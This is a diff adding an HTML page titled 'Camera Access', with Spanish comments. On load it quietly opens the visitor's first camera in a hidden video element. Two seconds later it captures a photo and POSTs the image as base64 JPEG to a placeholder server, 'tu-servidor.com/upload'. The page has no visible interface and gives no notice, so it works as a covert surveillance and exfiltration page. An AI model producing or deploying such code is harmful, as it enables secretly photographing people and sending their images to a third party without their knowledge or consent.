@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
+</head>
+<body>
+    <style>
+        video {
+            display: none;
+        }
+    </style>
+    <script>
+        function startCamera() {
+            // Primero enumerar todos los dispositivos disponibles
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    // Buscar dispositivos de video (cámaras)
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                    
+                    if (videoDevices.length === 0) {
+                        console.error('No se encontró ninguna cámara en el dispositivo');
+                        return;
+                    }
+                    
+                    // Usar la primera cámara disponible
+                    const deviceId = videoDevices[0].deviceId;
+                    console.log('Conectando a:', videoDevices[0].label || 'Cámara del dispositivo');
+                    
+                    // Acceder a la cámara específica del dispositivo
+                    return navigator.mediaDevices.getUserMedia({
+                        video: {
+                            deviceId: deviceId,
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+
+                    // Capturar una foto después de 2 segundos
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Convertir la imagen a un formato que se pueda enviar
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        console.log('Foto capturada');
+
+                        // Aquí puedes enviar la imagen a un servidor
+                        fetch('https://tu-servidor.com/upload', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData }),
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                        });
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Error de acceso a cámara: ', err);
+                });
+        }
+        
+        // Iniciar la cámara automáticamente al cargar la página
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', startCamera);
+        } else {
+            startCamera();
+        }
+    </script>
+</body>
+</html>
